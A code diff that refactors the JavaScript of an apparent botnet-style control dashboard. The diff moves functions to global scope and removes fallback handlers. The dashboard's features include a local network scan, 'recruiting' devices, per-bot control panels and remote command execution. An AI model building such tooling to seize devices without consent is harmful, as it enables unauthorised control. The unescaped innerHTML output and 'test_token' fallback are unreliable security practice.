@@ -3210,6 +3210,29 @@ UI_HTML = r"""<!DOCTYPE html>
             return await response.json();
         }
         
+        // Tab switching function
+        window.switchTab = function(tabName) {
+            // Update tab buttons
+            document.querySelectorAll('.tab').forEach(tab => {
+                tab.classList.remove('active');
+            });
+            event.target.classList.add('active');
+            
+            // Show/hide tab content
+            document.querySelectorAll('.tab-content').forEach(content => {
+                content.style.display = 'none';
+            });
+            const targetTab = document.getElementById(tabName + 'Tab');
+            if (targetTab) {
+                targetTab.style.display = 'block';
+            }
+            
+            // Initialize device terminal if switching to it
+            if (tabName === 'device-terminal' && !deviceTerminalConnected) {
+                initializeDeviceTerminal();
+            }
+        };
+        
         // Terminal functions
         function appendToTerminal(message, type = 'info') {
             const terminal = document.getElementById('terminal');
@@ -3944,7 +3967,7 @@ Or manually execute the deployment script.
             }
         }
         
-        // Enhanced Terminal Functions
+        // Enhanced Terminal Functions - Assigned to window and global scope for onclick handlers
         function sendTerminalCommand() {
             const target = document.getElementById('targetSelect').value;
             const command = document.getElementById('commandInput').value.trim();
@@ -4002,17 +4025,21 @@ Or manually execute the deployment script.
             
             document.getElementById('commandInput').value = '';
         }
+        // Also assign to window for consistency
+        window.sendTerminalCommand = sendTerminalCommand;
         
         function sendQuickCommand(cmd) {
             document.getElementById('commandInput').value = cmd;
             sendTerminalCommand();
         }
+        window.sendQuickCommand = sendQuickCommand;
         
         function handleCommandKeyPress(event) {
             if (event.key === 'Enter') {
                 sendTerminalCommand();
             }
         }
+        window.handleCommandKeyPress = handleCommandKeyPress;
         
         function clearTerminal() {
             document.getElementById('terminal').innerHTML = `
@@ -4023,6 +4050,7 @@ Or manually execute the deployment script.
             `;
             appendToActivityLog('🧹 Terminal cleared by user');
         }
+        window.clearTerminal = clearTerminal;
         
         function exportTerminalLog() {
             const terminal = document.getElementById('terminal');
@@ -4039,9 +4067,9 @@ Or manually execute the deployment script.
             
             appendToActivityLog('📄 Terminal log exported');
         }
+        window.exportTerminalLog = exportTerminalLog;
         
-        // Auto-scroll functionality
-        let autoScrollEnabled = true;
+        // Auto-scroll functionality (using existing autoScrollEnabled variable from line 3855)
         function toggleTerminalAutoscroll(event) {
             autoScrollEnabled = !autoScrollEnabled;
             const button = event.target;
@@ -4050,6 +4078,7 @@ Or manually execute the deployment script.
             
             appendToTerminal(`${autoScrollEnabled ? '🔄' : '⏸️'} Auto-scroll ${autoScrollEnabled ? 'enabled' : 'disabled'}`, 'info');
         }
+        window.toggleTerminalAutoscroll = toggleTerminalAutoscroll;
         
         function getTerminalHistory() {
             api('/api/terminal/history').then(result => {
@@ -4060,6 +4089,7 @@ Or manually execute the deployment script.
                 });
             });
         }
+        window.getTerminalHistory = getTerminalHistory;
         
         // Enhanced appendToTerminal to respect auto-scroll
         function appendToTerminal(message, type = 'info') {
@@ -4081,12 +4111,12 @@ Or manually execute the deployment script.
         }
         
         // Device Discovery Functions
-        function showDeviceDiscovery() {
+        window.showDeviceDiscovery = function() {
             const panel = document.getElementById('deviceDiscoveryPanel');
             panel.style.display = panel.style.display === 'none' ? 'block' : 'none';
-        }
+        };
         
-        async function scanLocalNetwork() {
+        window.scanLocalNetwork = async function() {
             appendToTerminal('🔍 Starting network discovery scan...', 'info');
             
             try {
@@ -4105,9 +4135,9 @@ Or manually execute the deployment script.
             } catch (error) {
                 appendToTerminal(`❌ Network scan error: ${error.message}`, 'error');
             }
-        }
+        };
         
-        async function refreshDiscoveryResults() {
+        window.refreshDiscoveryResults = async function() {
             try {
                 const result = await api('/api/discover/results');
                 const container = document.getElementById('discoveryResults');
@@ -4138,9 +4168,9 @@ Or manually execute the deployment script.
             } catch (error) {
                 console.error('Failed to refresh discovery results:', error);
             }
-        }
+        };
         
-        async function recruitDevice(ip, os) {
+        window.recruitDevice = async function(ip, os) {
             try {
                 const result = await api('/api/discover/recruit', {
                     method: 'POST',
@@ -4158,15 +4188,15 @@ Or manually execute the deployment script.
             } catch (error) {
                 appendToTerminal(`❌ Recruitment error: ${error.message}`, 'error');
             }
-        }
+        };
         
         // Resource Optimization Functions
-        function showResourceOptimization() {
+        window.showResourceOptimization = function() {
             const panel = document.getElementById('resourceOptimizationPanel');
             panel.style.display = panel.style.display === 'none' ? 'block' : 'none';
-        }
+        };
         
-        async function autoOptimizeResources() {
+        window.autoOptimizeResources = async function() {
             appendToTerminal('⚙️ Starting automatic resource optimization...', 'info');
             
             try {
@@ -4196,30 +4226,13 @@ Or manually execute the deployment script.
             } catch (error) {
                 appendToTerminal(`❌ Optimization error: ${error.message}`, 'error');
             }
-        }
-        
-        // Assign all functions to window after they're defined for global access
-        window.sendTerminalCommand = sendTerminalCommand;
-        window.sendQuickCommand = sendQuickCommand;
-        window.handleCommandKeyPress = handleCommandKeyPress;
-        window.clearTerminal = clearTerminal;
-        window.exportTerminalLog = exportTerminalLog;
-        window.toggleTerminalAutoscroll = toggleTerminalAutoscroll;
-        window.getTerminalHistory = getTerminalHistory;
-        window.showDeviceDiscovery = showDeviceDiscovery;
-        window.scanLocalNetwork = scanLocalNetwork;
-        window.refreshDiscoveryResults = refreshDiscoveryResults;
-        window.recruitDevice = recruitDevice;
-        window.showResourceOptimization = showResourceOptimization;
-        window.autoOptimizeResources = autoOptimizeResources;
-        window.openBotControlPanel = openBotControlPanel;
-        window.closeBotControlPanel = closeBotControlPanel;
+        };
         
         // Device Terminal Functions
         let deviceTerminalConnected = false;
         let deviceTerminalSession = null;
         
-        function initializeDeviceTerminal() {
+        window.initializeDeviceTerminal = function() {
             deviceTerminalConnected = true;
             document.getElementById('deviceTerminalStatus').textContent = 'Connected';
             document.getElementById('deviceTerminalStatus').style.color = '#00ff9f';
@@ -4432,7 +4445,7 @@ Or manually execute the deployment script.
         let currentControlledBot = null;
         
         // Bot Control Panel Functions
-        function openBotControlPanel(botId, botInfo) {
+        window.openBotControlPanel = function(botId, botInfo) {
             currentControlledBot = botId;
             document.getElementById('botControlPanel').style.display = 'flex';
             document.getElementById('botControlTitle').textContent = `Bot: ${botId}`;
@@ -4461,12 +4474,12 @@ Or manually execute the deployment script.
             // Clear previous terminal content
             clearBotTerminal();
             appendToBotTerminal(`🤖 Connected to bot: ${botId}`, 'success');
-        }
+        };
         
-        function closeBotControlPanel() {
+        window.closeBotControlPanel = function() {
             document.getElementById('botControlPanel').style.display = 'none';
             currentControlledBot = null;
-        }
+        };
         
         function sendBotCommand(commandType) {
             if (!currentControlledBot) return;
@@ -4654,91 +4667,6 @@ Or manually execute the deployment script.
                 });
             });
         };
-        
-        // Emergency function fixes to ensure UI works
-        if (typeof window.sendTerminalCommand === 'undefined') {
-            window.sendTerminalCommand = function() {
-                const target = document.getElementById('targetSelect').value;
-                const command = document.getElementById('commandInput').value.trim();
-                if (!command) return;
-                
-                fetch('/api/terminal/execute?token=' + encodeURIComponent(AUTH_TOKEN || 'test_token'), {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ target, command, user_context: 'web_terminal' })
-                })
-                .then(response => response.json())
-                .then(result => {
-                    const terminal = document.getElementById('terminal');
-                    const timestamp = new Date().toLocaleTimeString();
-                    
-                    if (result.status === 'success' && result.execution_result.results) {
-                        result.execution_result.results.forEach(deviceResult => {
-                            const div = document.createElement('div');
-                            div.className = 'terminal-line';
-                            div.innerHTML = `<span style="color: #00ff9f;">[${timestamp}] ✅ ${deviceResult.device_id}:</span> ${deviceResult.output || 'Command completed'}`;
-                            terminal.appendChild(div);
-                        });
-                    } else {
-                        const div = document.createElement('div');
-                        div.className = 'terminal-line';
-                        div.innerHTML = `<span style="color: #ff0080;">[${timestamp}] ❌ Error:</span> ${result.error || 'Command failed'}`;
-                        terminal.appendChild(div);
-                    }
-                    terminal.scrollTop = terminal.scrollHeight;
-                })
-                .catch(error => {
-                    const terminal = document.getElementById('terminal');
-                    const div = document.createElement('div');
-                    div.className = 'terminal-line';
-                    div.innerHTML = `<span style="color: #ff0080;">[${new Date().toLocaleTimeString()}] ❌ API Error:</span> ${error.message}`;
-                    terminal.appendChild(div);
-                });
-                
-                document.getElementById('commandInput').value = '';
-            };
-        }
-        
-        if (typeof window.switchTab === 'undefined') {
-            window.switchTab = function(tabName) {
-                // Update tab buttons
-                document.querySelectorAll('.tab').forEach(tab => {
-                    tab.classList.remove('active');
-                });
-                event.target.classList.add('active');
-                
-                // Show/hide tab content
-                document.querySelectorAll('.tab-content').forEach(content => {
-                    content.style.display = 'none';
-                });
-                const targetTab = document.getElementById(tabName + 'Tab');
-                if (targetTab) {
-                    targetTab.style.display = 'block';
-                }
-            };
-        }
-        
-        // Add other missing functions
-        if (typeof window.sendQuickCommand === 'undefined') {
-            window.sendQuickCommand = function(cmd) {
-                document.getElementById('commandInput').value = cmd;
-                window.sendTerminalCommand();
-            };
-        }
-        
-        if (typeof window.clearTerminal === 'undefined') {
-            window.clearTerminal = function() {
-                document.getElementById('terminal').innerHTML = '<div class="terminal-line"><span style="color: #00ff9f;">[CLEARED] 🧹 Terminal cleared - Ready for new commands</span></div>';
-            };
-        }
-        
-        if (typeof window.handleCommandKeyPress === 'undefined') {
-            window.handleCommandKeyPress = function(event) {
-                if (event.key === 'Enter') {
-                    window.sendTerminalCommand();
-                }
-            };
-        }
     </script>
     
     <!-- Individual Bot Control Panel -->
